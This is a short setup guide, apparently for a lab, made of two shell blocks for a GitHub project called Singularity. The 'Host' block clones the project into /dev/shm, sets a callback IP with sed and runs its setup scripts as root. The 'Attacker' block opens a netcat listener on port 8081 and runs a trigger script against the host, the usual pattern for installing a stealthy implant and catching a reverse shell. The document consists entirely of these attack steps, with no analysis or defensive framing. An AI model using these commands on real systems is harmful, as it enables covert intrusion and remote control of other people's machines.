# Setup
### Host
```shell
cd /dev/shm
git clone https://github.com/MatheuZSecurity/Singularity
cd Singularity
sed -i 's/127.0.0.1/192.168.56.102/' include/core.h
sudo bash setup.sh
sudo bash scripts/x.sh
cd ..
```
### Attacker
```shell
sudo apt install git python3
cd /dev/shm
git clone https://github.com/MatheuZSecurity/Singularity
cd Singularity
nc -lvnp 8081
sudo python3 scripts/trigger.py 192.168.56.101
```
